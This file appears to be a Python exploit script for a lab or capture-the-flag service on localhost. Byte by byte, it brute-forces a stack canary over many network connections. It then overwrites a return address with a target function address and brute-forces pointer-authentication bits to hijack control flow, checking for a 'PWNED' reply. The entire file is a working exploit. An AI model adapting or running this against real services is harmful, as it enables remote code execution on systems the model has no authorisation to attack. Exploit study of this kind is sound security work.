import socket
import struct
import sys
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9999
WIN = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x400930


def read_all(s):
    data = b""
    try:
        while True:
            b = s.recv(64)
            if not b:
                break
            data += b
    except Exception:
        pass
    return data


def batch(payloads, timeout=8):
    socks = []
    for p in payloads:
        try:
            s = socket.socket()
            s.settimeout(timeout)
            s.connect(("127.0.0.1", PORT))
            s.sendall(p)
            socks.append(s)
        except Exception as e:
            print("connect fail", e, flush=True)
            socks.append(None)
    outs = []
    for s in socks:
        if s is None:
            outs.append(b"")
            continue
        outs.append(read_all(s))
        s.close()
    return outs


canary = bytearray(8)
queries = 0
t0 = time.time()

# byte 0: glibc canary low byte is 0x00
out = batch([bytes([1, 0, 0])])
queries += 1
if b"SURVIVED" not in out[0]:
    print("canary[0] not 0x00; brute-forcing", flush=True)
    outs = batch([bytes([1, 0, g]) for g in range(256)])
    queries += 256
    hits = [g for g, o in enumerate(outs) if b"SURVIVED" in o]
    if not hits:
        print("canary[0] not found", flush=True)
        sys.exit(1)
    canary[0] = hits[0]
else:
    canary[0] = 0
print("canary[0]=0x%02x" % canary[0], flush=True)

for i in range(1, 8):
    payloads = [
        bytes([i + 1, 0]) + bytes(canary[:i]) + bytes([g]) for g in range(256)
    ]
    outs = batch(payloads)
    queries += 256
    hits = [g for g, o in enumerate(outs) if b"SURVIVED" in o]
    if not hits:
        print("canary[%d] not found" % i, flush=True)
        sys.exit(1)
    canary[i] = hits[0]
    print(
        "canary[%d]=0x%02x  t=%.1fs" % (i, canary[i], time.time() - t0),
        flush=True,
    )

print("canary=%s" % canary.hex(), flush=True)

payloads = []
for g in range(128):
    lr = WIN | (g << 48)
    payloads.append(bytes([8, 8]) + bytes(canary) + struct.pack("<Q", lr))
outs = batch(payloads)
queries += 128
hits = [g for g, o in enumerate(outs) if b"PWNED" in o]
print(
    "pac_hits=%s queries=%d elapsed=%.1fs"
    % (hits, queries, time.time() - t0),
    flush=True,
)
sys.exit(0 if hits else 1)
